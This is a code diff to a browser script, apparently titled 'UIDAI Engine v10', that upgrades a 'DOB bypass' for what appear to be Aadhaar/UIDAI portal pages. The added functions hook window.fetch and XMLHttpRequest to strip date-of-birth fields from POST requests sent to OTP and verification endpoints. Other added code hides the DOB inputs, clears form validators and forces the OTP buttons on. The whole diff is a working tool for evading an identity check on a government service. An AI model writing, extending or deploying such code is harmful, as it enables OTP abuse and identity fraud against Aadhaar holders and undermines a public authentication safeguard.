@@ -1,5 +1,5 @@
 /**
- * UIDAI Engine v9.3 — True DOB bypass: UIDAI mode switch only, NO fake DOB fill
+ * UIDAI Engine v10 — Advanced DOB bypass: mode switch + neutralize + OTP payload strip
  */
 (function (root, factory) {
   if (typeof module !== 'undefined' && module.exports) {
@@ -221,6 +221,162 @@
   }
 
   /** Angular email empty block karta hai — disable + validators clear */
+  function isDobPayloadKey(key) {
+    return (
+      isDobControlKey(key) ||
+      /^(dob|dateofbirth|date_of_birth|dateOfBirth|birthDate|birth_date|dtbirth|userdob|dobstr)$/i.test(key || '')
+    );
+  }
+
+  function stripDobDeep(val, depth) {
+    if (val == null || depth > 12) return val;
+    if (typeof val === 'string') {
+      const t = val.trim();
+      if ((t.startsWith('{') && t.endsWith('}')) || (t.startsWith('[') && t.endsWith(']'))) {
+        try {
+          return JSON.stringify(stripDobDeep(JSON.parse(t), depth + 1));
+        } catch (_e) {}
+      }
+      if (t.includes('=') && /[dD]ob|birth|dateOfBirth/.test(t)) {
+        return t
+          .split('&')
+          .filter((p) => {
+            const k = decodeURIComponent((p.split('=')[0] || '')).toLowerCase();
+            return !isDobPayloadKey(k);
+          })
+          .join('&');
+      }
+      return val;
+    }
+    if (val instanceof FormData) {
+      const fd = new FormData();
+      val.forEach((v, k) => {
+        if (!isDobPayloadKey(k)) fd.append(k, v);
+      });
+      return fd;
+    }
+    if (Array.isArray(val)) return val.map((x) => stripDobDeep(x, depth + 1));
+    if (typeof val === 'object') {
+      const out = {};
+      Object.entries(val).forEach(([k, v]) => {
+        if (isDobPayloadKey(k)) return;
+        out[k] = stripDobDeep(v, depth + 1);
+      });
+      return out;
+    }
+    return val;
+  }
+
+  function isRetrieveOtpUrl(url) {
+    return /otp|retrieve|send|generate|aadhaar|uidai|myaadhaar|auth|verify|gov\.in/i.test(String(url || ''));
+  }
+
+  function installNetworkBypass(hooks) {
+    if (window.__rebelNetBypass10) return;
+    window.__rebelNetBypass10 = true;
+    const log = hooks?.log;
+    const enabled = hooks?.enabled || (() => true);
+    const onHit = hooks?.onHit || (() => {});
+
+    const origFetch = window.fetch;
+    if (origFetch) {
+      window.fetch = function (input, init) {
+        const opts = init ? Object.assign({}, init) : {};
+        const url = typeof input === 'string' ? input : input?.url || '';
+        const method = String(opts.method || 'GET').toUpperCase();
+        if (enabled() && method === 'POST' && isRetrieveOtpUrl(url) && opts.body != null) {
+          opts.body = stripDobDeep(opts.body, 0);
+          log?.('info', 'OTP payload — DOB field hata di', url.slice(0, 100));
+        }
+        if (enabled() && (isRetrieveOtpUrl(url) || method === 'POST')) {
+          onHit('fetch', method, url);
+        }
+        return origFetch.call(this, input, opts);
+      };
+    }
+
+    const XHR = window.XMLHttpRequest?.prototype;
+    if (XHR) {
+      const origOpen = XHR.open;
+      const origSend = XHR.send;
+      XHR.open = function (method, url) {
+        this.__rebelMethod = String(method || 'GET').toUpperCase();
+        this.__rebelUrl = String(url || '');
+        return origOpen.apply(this, arguments);
+      };
+      XHR.send = function (body) {
+        if (enabled() && this.__rebelMethod === 'POST' && isRetrieveOtpUrl(this.__rebelUrl) && body != null) {
+          body = stripDobDeep(body, 0);
+          log?.('info', 'OTP payload — DOB field hata di', (this.__rebelUrl || '').slice(0, 100));
+        }
+        if (enabled() && (isRetrieveOtpUrl(this.__rebelUrl) || this.__rebelMethod === 'POST')) {
+          onHit('xhr', this.__rebelMethod, this.__rebelUrl);
+        }
+        return origSend.call(this, body);
+      };
+    }
+  }
+
+  /** DOB ko form se hatao — validators clear, hide, NO fake date */
+  function neutralizeDobControls(uiSel, log) {
+    injectCss();
+    let n = 0;
+    findDobBlocks().forEach((block) => {
+      disableDobDom(block);
+      block.classList.add(HIDDEN_MARK);
+      block.setAttribute('data-rebel-dob-hidden', '1');
+      block.style.setProperty('display', 'none', 'important');
+      n += 1;
+    });
+    getDobInputs().forEach((input) => {
+      input.disabled = true;
+      input.removeAttribute('required');
+      input.setAttribute('aria-required', 'false');
+      input.setCustomValidity?.('');
+      input.removeAttribute('name');
+      input.removeAttribute('formcontrolname');
+      input.dataset.rebelDobOff = '1';
+      const box = fieldContainer(input);
+      if (box) {
+        box.classList.add(HIDDEN_MARK);
+        box.setAttribute('data-rebel-dob-hidden', '1');
+        box.style.setProperty('display', 'none', 'important');
+      }
+      n += 1;
+    });
+    collectFormGroups().forEach((form) => {
+      const walk = (group) => {
+        Object.entries(group.controls || {}).forEach(([key, ctrl]) => {
+          if (isFormGroup(ctrl)) walk(ctrl);
+          else if (isDobControlKey(key)) {
+            ctrl.clearValidators?.();
+            ctrl.setErrors?.(null);
+            try {
+              ctrl.disable({ emitEvent: false });
+            } catch (_e) {}
+          }
+        });
+      };
+      walk(form);
+      form.updateValueAndValidity?.({ emitEvent: false });
+    });
+    patchAngularForms(log);
+    if (n) log?.('info', 'DOB form logic neutralized', { count: n });
+    return n;
+  }
+
+  function advancedBypass(uiSel, log) {
+    quickModeSwitch(uiSel, log);
+    neutralizeEmail(log);
+    if (!isDobBypassed(uiSel)) neutralizeDobControls(uiSel, log);
+    enableOtpButtons();
+    return {
+      dobBypassed: isDobBypassed(uiSel),
+      dobVisible: dobFieldVisible(uiSel),
+      orLinks: discoverOrLinks(uiSel).map((l) => l.text),
+    };
+  }
+
   function neutralizeEmail(log) {
     let n = 0;
     getMatFields().forEach((f) => {
@@ -253,6 +409,7 @@
   /** Bypass = DOB screen/form se hat gaya (DOM me ho sakta hai par UIDAI ne hide/remove kiya) */
   function isDobInputActive(input, uiSel) {
     if (!input || input.type === 'hidden') return false;
+    if (input.dataset?.rebelDobOff === '1') return false;
     if (input.closest('[data-rebel-dob-hidden],[data-rebel-dob-off]')) return false;
     const box = fieldContainer(input);
     if (box) {
@@ -890,7 +1047,10 @@
         bypassPoller = null;
         return;
       }
-      tryUidaiModeSwitch(uiSel, log);
+      if (isDobBypassed(uiSel)) return;
+      tryUidaiModeSwitch(uiSel, log).then(() => {
+        if (!isDobBypassed(uiSel)) advancedBypass(uiSel, log);
+      });
     }, 2500);
   }
 
@@ -903,8 +1063,7 @@
       watchTimer = setTimeout(() => {
         watchTimer = null;
         if (isDobBypassed(uiSel)) return;
-        quickModeSwitch(uiSel, log);
-        neutralizeEmail(log);
+        advancedBypass(uiSel, log);
       }, 500);
     });
     dobWatcher.observe(document.documentElement, { childList: true, subtree: true, attributes: true });
@@ -916,15 +1075,11 @@
     return runModeSwitchRetry(uiSel, log, 6).then(() => {
       return new Promise((resolve) => {
         setTimeout(() => {
-          neutralizeEmail(log);
-          if (!isDobBypassed(uiSel)) {
-            quickModeSwitch(uiSel, log);
-            log?.('warn', 'DOB abhi form me — Switch Mode dubara try', {
-              dobCount: getDobInputs().length,
-              orLinks: discoverOrLinks(uiSel).map((l) => l.text),
-            });
+          const adv = advancedBypass(uiSel, log);
+          if (!adv.dobBypassed) {
+            log?.('warn', 'DOB abhi dikhe — Bypass DOB dubara dabao', adv);
           } else {
-            log?.('info', 'DOB bypass OK — UIDAI ne DOB hata diya', {});
+            log?.('info', 'DOB bypass OK — form ready (bina DOB)', { dobVisible: adv.dobVisible });
           }
           const diag = getFormDiagnostics(uiSel);
           const state = {
@@ -963,8 +1118,10 @@
     };
     log?.('info', 'Send OTP prep', state);
     if (!bypassed) {
-      log?.('error', 'DOB bypass fail — Switch Mode dabao (DOB fill mat karo, fake date kaam nahi karega)', {
+      log?.('error', 'DOB bypass fail — Bypass DOB dabao (DOB mat bharo)', {
         dobInForm: state.dobInForm,
+        dobVisible: after.dobVisible,
+        orLinks: after.orLinks,
       });
     } else if (!state.formOk) {
       const miss = (after.fields || []).filter(
@@ -975,30 +1132,28 @@
     return state;
   }
 
-  /** OTP prep — sirf mode switch + email neutralize; DOB fill KABHI NAHI */
+  /** OTP prep — mode switch + DOB neutralize; fake date KABHI NAHI */
   function prepareSubmit(uiSel, log) {
-    if (!isDobBypassed(uiSel)) quickModeSwitch(uiSel, log);
-    neutralizeEmail(log);
-    enableOtpButtons();
+    advancedBypass(uiSel, log);
     return buildSubmitState(uiSel, log);
   }
 
-  /** Mode switch ke baad wait — UIDAI DOM update async hota hai */
+  /** Mode switch + fallback neutralize */
   async function ensureDobBypassed(uiSel, log, tries) {
     if (isDobBypassed(uiSel)) return true;
-    const n = tries || 8;
+    const n = tries || 10;
     for (let i = 0; i < n; i++) {
       await tryUidaiModeSwitch(uiSel, log);
       if (isDobBypassed(uiSel)) return true;
-      await new Promise((r) => setTimeout(r, 700));
+      await waitMs(700);
     }
+    advancedBypass(uiSel, log);
     return isDobBypassed(uiSel);
   }
 
   async function prepareSubmitAsync(uiSel, log) {
-    await ensureDobBypassed(uiSel, log, 8);
-    neutralizeEmail(log);
-    enableOtpButtons();
+    await ensureDobBypassed(uiSel, log, 10);
+    advancedBypass(uiSel, log);
     return buildSubmitState(uiSel, log);
   }
 
@@ -1072,5 +1227,9 @@
     getMatFields,
     classifyField,
     stopWatcher,
+    neutralizeDobControls,
+    advancedBypass,
+    installNetworkBypass,
+    stripDobDeep,
   };
 });
